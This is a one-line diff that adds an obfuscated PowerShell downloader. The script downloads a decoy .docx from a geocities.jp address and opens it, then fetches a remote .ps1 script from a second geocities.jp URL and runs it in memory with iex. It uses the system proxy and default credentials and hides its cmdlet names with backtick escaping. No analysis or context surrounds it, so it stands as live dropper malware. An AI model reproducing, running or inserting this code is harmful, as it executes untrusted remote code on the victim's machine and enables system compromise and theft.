@@ -1,0 +1,1 @@
+﻿$n=nEW`-`ObjEct net.webclient;; $n.proxy=[Net.WebRequest]::GetSystemWebProxy();; $n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;; $n.DownloadFile("http://www.geocities.jp/lgxpoy6/zaavar.docx","$env:temp\zaavar.docx");; s`T`ARt-PRocE`SS "$env:temp\zaavar.docx"; i`ex $n.downloadstring('http://www.geocities.jp/frgrjxq1/f0921.ps1');
